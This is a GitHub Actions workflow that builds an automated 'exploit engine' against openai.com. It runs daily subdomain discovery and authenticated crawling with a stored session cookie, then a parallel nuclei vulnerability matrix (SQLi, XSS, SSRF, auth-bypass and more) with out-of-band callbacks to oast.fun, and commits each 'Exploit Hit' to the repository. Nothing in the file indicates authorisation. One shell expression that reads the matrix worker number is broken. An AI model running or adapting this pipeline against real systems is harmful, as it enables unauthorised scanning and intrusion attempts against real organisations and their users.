name: "Elite Parallel Exploit Engine 2026 â€” MAX BOUNTY"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

env:
  PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
  AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}
  OPENAI_KEY: ${{ secrets.OPENAI_API_KEY }}
  GH_DORKER_TOKEN: ${{ secrets.GH_DORKER_TOKEN }}

jobs:

  recon:
    runs-on: ubuntu-latest
    continue-on-error: true

    steps:
      - uses: actions/checkout@v4

      - name: Install Recon Arsenal
        run: |
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          go install github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Passive Subdomain Discovery
        run: subfinder -d openai.com -all -silent -o subs.txt || true

      - name: Cloud & External Asset Discovery
        run: uncover -q "openai.com" -limit 1000 -auth "$PDCP_API_KEY" >> subs.txt || true

      - name: Alive Filtering
        run: sort -u subs.txt | httpx -silent -o alive.txt || touch alive.txt

      - name: Authenticated Deep Crawl
        run: |
          katana -list alive.txt -jc -kf all -d 3 \
          -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt

      - name: Normalize & Index Targets
        run: |
          touch params.txt
          grep -vFf params.txt params_new.txt > to_scan.txt || cp params_new.txt to_scan.txt
          cat params.txt params_new.txt | sort -u > master_updated.txt

      - name: Split Target Buckets
        run: |
          mkdir -p buckets
          split -n l/7 to_scan.txt buckets/bucket_

      - uses: actions/upload-artifact@v4
        with:
          name: targets
          path: |
            master_updated.txt
            buckets/

  fuzz:
    needs: recon
    if: always()
    runs-on: ubuntu-latest
    continue-on-error: true

    strategy:
      max-parallel: 7
      fail-fast: false
      matrix:
        worker: [0,1,2,3,4,5,6]
        vuln: [sqli, xss, ssti, ssrf, idor, lfi, rfi, takeovers, misconfig, exposure, auth-bypass, logic]

    steps:
      - uses: actions/checkout@v4

      - uses: actions/download-artifact@v4
        with:
          name: targets

      - name: Install Nuclei Engine
        run: |
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH
          nuclei -ut

      - name: Execute Exploit Matrix
        run: |
          TARGET_FILE=$(ls buckets/bucket_* | sed -n "$((matrix.worker+1))p")
          [ -s "$TARGET_FILE" ] || exit 0

          nuclei -l "$TARGET_FILE" \
            -severity critical,high,medium \
            -tags ${{ matrix.vuln }},cve,cve2025,cve2026 \
            -interactsh-server oast.fun \
            -H "Cookie: $AUTH_COOKIE" \
            -o results.txt || true

      - name: Persist Intelligence
        run: |
          git config user.email "bot@hacker.ai"
          git config user.name "Exploit-Bot"

          git fetch origin main
          git reset --hard origin/main

          [ -f master_updated.txt ] && cp master_updated.txt params.txt
          mkdir -p vulnerabilities
          [ -f results.txt ] && cp results.txt vulnerabilities/${{ matrix.vuln }}_worker${{ matrix.worker }}.txt

          git add params.txt vulnerabilities || true
          git commit -m "Exploit Hit: ${{ matrix.vuln }} | Worker ${{ matrix.worker }} | $(date -u)" || true
          git push || true
